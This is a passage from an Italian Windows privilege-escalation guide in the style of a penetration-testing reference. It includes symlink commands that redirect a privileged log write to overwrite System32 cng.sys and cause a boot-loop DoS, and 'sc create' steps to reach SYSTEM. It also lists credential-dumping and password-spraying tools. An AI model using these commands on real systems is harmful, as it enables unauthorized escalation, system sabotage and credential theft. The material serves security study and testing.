2. Reindirizza il percorso senza privilegi di amministratore:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Attendi che il componente privilegiato scriva il log (ad esempio, l'amministratore attiva "invia SMS di test"). La scrittura ora finisce in `C:\Windows\System32\cng.sys`.
4. Ispeziona la destinazione sovrascritta (parser hex/PE) per confermare la corruzione; il riavvio forza Windows a caricare il percorso del driver manomesso → **boot loop DoS**. Questo si applica anche a qualsiasi file protetto che un servizio privilegiato aprirà in scrittura.

> `cng.sys` viene normalmente caricato da `C:\Windows\System32\drivers\cng.sys`, ma se esiste una copia in `C:\Windows\System32\cng.sys` questa può essere tentata per prima, rendendola un sink DoS affidabile per dati corrotti.



## **Da High Integrity a System**

### **Nuovo servizio**

Se stai già eseguendo un processo High Integrity, la **strada verso SYSTEM** può essere semplice: basta **creare ed eseguire un nuovo servizio**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Quando crei un service binary, assicurati che sia un servizio valido o che il binary esegua rapidamente le azioni necessarie, poiché verrà terminato in 20s se non è un servizio valido.

### AlwaysInstallElevated

Da un processo High Integrity puoi provare ad **abilitare le registry entries AlwaysInstallElevated** e **installare** una reverse shell usando un wrapper _**.msi**_.\
[Ulteriori informazioni sulle registry keys coinvolte e su come installare un package _.msi_ sono disponibili qui.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puoi** [**trovare il codice qui**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Se disponi di questi token privileges (probabilmente li troverai in un processo High Integrity già esistente), potrai **aprire quasi qualsiasi processo** (ad eccezione dei protected processes) con il privilege SeDebug, **copiare il token** del processo e creare un **processo arbitrario con quel token**.\
Usando questa tecnica, di solito si **seleziona un processo in esecuzione come SYSTEM con tutti i token privileges** (_sì, puoi trovare processi SYSTEM senza tutti i token privileges_).\
**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica viene usata da meterpreter per effettuare l'escalation in `getsystem`. La tecnica consiste nel **creare una pipe e quindi creare/abusare di un servizio per scrivere su quella pipe**. Il **server** che ha creato la pipe usando il privilege **`SeImpersonate`** potrà quindi **impersonare il token** del client della pipe (il servizio), ottenendo i privilegi SYSTEM.\
Se vuoi [**saperne di più sulle named pipes, dovresti leggere questo**](#named-pipe-client-impersonation).\
Se vuoi leggere un esempio di [**come passare da high integrity a System usando le named pipes, dovresti leggere questo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Se riesci a **fare hijacking di una dll** che viene **caricata** da un **processo** in esecuzione come **SYSTEM**, potrai eseguire codice arbitrario con quei permessi. Di conseguenza, il Dll Hijacking è utile anche per questo tipo di privilege escalation e, inoltre, è **molto più facile da ottenere da un processo high integrity**, poiché avrà **write permissions** sulle cartelle utilizzate per caricare le dll.\
**Puoi** [**saperne di più sul Dll hijacking qui**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Leggi:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Ulteriore assistenza

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Strumenti utili

**Miglior strumento per cercare Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Verifica la presenza di misconfigurations e sensitive files (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Rilevate.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Verifica la presenza di alcune possibili misconfigurations e raccoglie informazioni (**[**controlla qui**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Verifica la presenza di misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Estrae le informazioni sulle sessioni salvate di PuTTY, WinSCP, SuperPuTTY, FileZilla e RDP. Usa -Thorough in locale.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Estrae le crendentials dal Credential Manager. Rilevate.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Esegue lo spray delle password raccolte nel domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh è uno strumento PowerShell per lo spoofing ADIDNS/LLMNR/mDNS e man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Cerca vulnerabilità privesc note (DEPRECATED in favore di Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Controlli locali **(richiede diritti Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Cerca vulnerabilità privesc note (deve essere compilato usando VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Esegue l'enumeration dell'host cercando misconfigurations (è più uno strumento di raccolta informazioni che di privesc) (deve essere compilato) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Estrae credentials da numerosi software (exe precompiled su github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Porting di PowerUp in C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Verifica la presenza di misconfiguration (eseguibile precompiled su github). Non consigliato. Non funziona bene su Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Verifica la presenza di possibili misconfigurations (exe da python). Non consigliato. Non funziona bene su Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Strumento creato sulla base di questo post (non necessita di accesschk per funzionare correttamente, ma può utilizzarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Legge l'output di **systeminfo** e suggerisce exploit funzionanti (python locale)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Legge l'output di **systeminfo** e suggerisce exploit funzionanti (python locale)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Devi compilare il progetto usando la versione corretta di .NET ([vedi qui](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Per visualizzare la versione installata di .NET sull'host vittima puoi eseguire:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Riferimenti

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: phishing tramite macro VBA di Word via SMTP → decrittazione delle credenziali di hMailServer → Veeam CVE-2023-27532 a SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: leak di una format-string + stack BOF → VirtualAlloc ROP (RCE) e furto del kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – A caccia della Silver Fox: gatto e topo nelle ombre del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Vulnerabilità del file system con privilegi presente in un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Strumenti per il testing dei Symbolic Link – utilizzo di CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [Un Link al passato. Abusare dei Symbolic Link su Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (porting Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: risoluzione pericolosa dei moduli su Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Moduli Node.js: caricamento dalle cartelle `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [Trail of Bits - sfide della checklist C/C++, risolte](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [Microsoft Learn - funzione RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [Pwn2Own con Microslop: concatenamento delle race condition del kernel CLDFLT e DirectX per Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [Un I/O Ring per dominarli tutti: una primitive di exploit completa di lettura/scrittura su Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)

{{#include ../../banners/hacktricks-training.md}}
